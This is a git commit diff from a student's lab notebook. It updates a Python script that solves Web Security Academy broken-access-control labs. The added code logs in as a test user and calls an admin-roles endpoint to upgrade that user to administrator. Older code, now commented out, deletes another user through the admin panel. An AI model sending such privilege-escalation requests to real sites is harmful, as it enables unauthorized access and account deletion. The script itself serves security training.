52495a75ff7f73472fa8e422115a5e0246a218da
Maksim Semchuk <semchuk2@pdx.edu>
2021-04-18 20:10:56 -0700

    completed 1.5.6 part 2

--- Lab Notebook #1/Lab 1.5/Lab_1-5_Broken-access-control_1.py
+++ Lab Notebook #1/Lab 1.5/Lab_1-5_Broken-access-control_1.py
@@ -1,7 +1,27 @@
 import requests
 from bs4 import BeautifulSoup
 
-site = 'ac3a1fdf1f277524800f73e1002e007d.web-security-academy.net'
+site = 'ac5b1f1d1eea38bd800bb785005a0066.web-security-academy.net'
+s = requests.Session()
+
+login_url = f'https://{site}/login'
+login_data = {'password': 'peter', 'username': 'wiener'}
+resp = s.post(login_url, data=login_data)
+
+upgrade_data = {
+    'action': 'upgrade',
+    'username': 'wiener'
+}
+
+url = f'https://{site}/admin-roles?username=wiener&action=upgrade'
+url_2 = f'https://{site}/admin'
+resp = s.get(url)
+resp = s.get(url_2)
+print(resp.status_code)
+# print(resp.text)
+
+
+"""site = 'ac3a1fdf1f277524800f73e1002e007d.web-security-academy.net'
 s = requests.Session()
 login_url = f'https://{site}/login'
 login_data = {'password': 'peter', 'username': 'wiener'}
@@ -25,3 +45,4 @@ carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.ge
 
 delete_uri = carlos_delete_link[0]['href']
 s.get(f'https://{site}{delete_uri}')
+"""
